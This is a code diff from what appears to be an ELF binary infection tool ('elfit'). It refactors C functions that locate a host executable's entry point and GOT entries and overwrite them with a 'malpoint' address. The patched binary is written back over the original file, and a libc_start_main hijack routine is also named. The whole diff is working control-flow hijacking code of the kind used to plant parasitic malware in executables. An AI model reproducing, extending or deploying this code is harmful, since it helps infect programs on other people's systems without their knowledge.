@@ -1,21 +1,15 @@
 #include "elfit.h"
 
-int entry_redirect_32(Elfit_t *host, uint32_t malpoint)
+int commit_redirect_32(Elfit_t *host, off_t location, uint32_t malpoint)
 {
     int ofd, c;
-    Elf32_Ehdr *ehdr;
-    
-    printf("[+ ENTRY_POINT REDIR]\tPatching host's entrypoint to 0x%x\n", malpoint);
 
-    ehdr = (Elf32_Ehdr *) host->mem;
+    *(uint32_t *)&host->mem[location] = malpoint;
 
-    ehdr->e_entry = malpoint;
-
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
-        < 0)
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode)) < 0)
     {
         perror("tmp binary: open");
-        return -1; 
+        return -1;
     }
 
     if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
@@ -28,33 +22,49 @@ int entry_redirect_32(Elfit_t *host, uint32_t malpoint)
     return 1;
 }
 
-int entry_redirect_64(Elfit_t *host, uint64_t malpoint)
+int commit_redirect_64(Elfit_t *host, off_t location, uint64_t malpoint)
 {
     int ofd, c;
+
+    *(uint64_t *)&host->mem[location] = malpoint;
+
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode)) < 0)
+    {
+        perror("tmp binary: open");
+        return -1;
+    }
+
+    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
+    {
+        perror("tmp binary: write");
+        return -1;
+    }
+
+    rename(TMP, host->name);
+    return 1;
+}
+
+off_t entry_redirect_32(Elfit_t *host, uint32_t *patch_addr)
+{
+    Elf32_Ehdr *ehdr;
+    
+    ehdr = (Elf32_Ehdr *) host->mem;
+
+    *patch_addr = ehdr->e_entry;
+    return ((unsigned long) &ehdr->e_entry) - ((unsigned long) host->mem);
+}
+
+off_t entry_redirect_64(Elfit_t *host, uint64_t *patch_addr)
+{
     Elf64_Ehdr *ehdr;
 
     ehdr = (Elf64_Ehdr *) host->mem;
 
-    ehdr->e_entry = malpoint;
-
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
-        < 0)
-    {
-        perror("tmp binary: open");
-        return -1; 
-    }
-
-    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
-    {
-        perror("tmp binary: write");
-        return -1;
-    }
-
-    rename(TMP, host->name);
-    return 1;
+    *patch_addr = ehdr->e_entry;
+    return ((unsigned long) &ehdr->e_entry) - ((unsigned long) host->mem);
 }
 
-Elf32_Addr got_redirect_32(Elfit_t *host, char *target, uint32_t malpoint)
+off_t got_redirect_32(Elfit_t *host, char *target, uint32_t *patch_addr)
 {
     Elf32_Ehdr *ehdr;
     Elf32_Shdr *shdr;
@@ -119,30 +129,11 @@ Elf32_Addr got_redirect_32(Elfit_t *host, char *target, uint32_t malpoint)
 
     relocptr = data_offset + ((Elf32_Off) (gotptr - data_vaddr));
 
-    printf("[+ .GOT REDIR]\t\tPatching 0x%x (offset 0x%x) with 0x%x\n",
-        gotptr, relocptr,  malpoint);
-    *(unsigned long*)&host->mem[relocptr] = malpoint;
-
-    /* writing changes to a file */
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
-        < 0)
-    {
-        perror("tmp binary: open");
-        return -1; 
-    }
-
-    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
-    {
-        perror("tmp binary: write");
-        return -1;
-    }
-
-    rename(TMP, host->name);
-    
-    return gotptr;
+    *patch_addr = *((uint32_t *) &host->mem[relocptr]); 
+    return relocptr;
 }
 
-Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
+off_t got_redirect_64(Elfit_t *host, char *target, uint64_t *patch_addr)
 {
     Elf64_Ehdr *ehdr;
     Elf64_Shdr *shdr;
@@ -208,27 +199,8 @@ Elf64_Addr got_redirect_64(Elfit_t *host, char *target, uint64_t malpoint)
 
     relocptr = data_offset + ((Elf64_Off) (gotptr - data_vaddr));
 
-    printf("[+ .GOT REDIR]\t\tPatching 0x%x (offset 0x%x) with 0x%x\n",
-        gotptr, relocptr,  malpoint);
-    *(unsigned long*)&host->mem[relocptr] = malpoint;
-
-    /* writing changes to a file */
-    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
-        < 0)
-    {
-        perror("tmp binary: open");
-        return -1; 
-    }
-
-    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
-    {
-        perror("tmp binary: write");
-        return -1;
-    }
-
-    rename(TMP, host->name);
-    
-    return gotptr;
+    *patch_addr = *((uint64_t *) &host->mem[relocptr]); 
+    return relocptr;
 }
 
 int libc_start_main_hijack_32(Elfit_t *host, uint32_t malpoint, int mode)
